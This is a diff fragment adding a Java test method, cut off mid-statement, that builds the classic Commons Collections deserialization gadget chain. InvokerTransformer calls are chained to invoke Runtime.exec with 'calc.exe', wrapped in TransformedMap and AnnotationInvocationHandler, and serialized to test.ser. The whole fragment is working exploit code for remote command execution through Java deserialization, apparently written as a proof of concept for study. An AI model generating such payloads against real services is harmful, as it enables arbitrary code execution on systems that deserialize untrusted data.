@@ -1,0 +1,21 @@
+public void testInvoker() throws Exception {
+    String cmd = "calc.exe";
+    String[] execArgs = new String[] { cmd };
+    Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {
+                    String.class, Class[].class }, new Object[] {
+                    "getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {
+                    Object.class, Object[].class }, new Object[] {
+                    null, new Object[0] }),
+            new InvokerTransformer("exec",
+                    new Class[] { String[].class }, new Object[] { execArgs }),
+            new ConstantTransformer(1) };
+
+    Map innerMap = new HashMap();
+    Map outMap = TransformedMap.decorate(innerMap, null, transformers);
+
+    AnnotationInvocationHandler aih = new AnnotationInvocationHandler(null, outMap);
+    FileOutputStream fos = new FileOutputStream("test.ser");
+    ObjectOutputStream oos = new
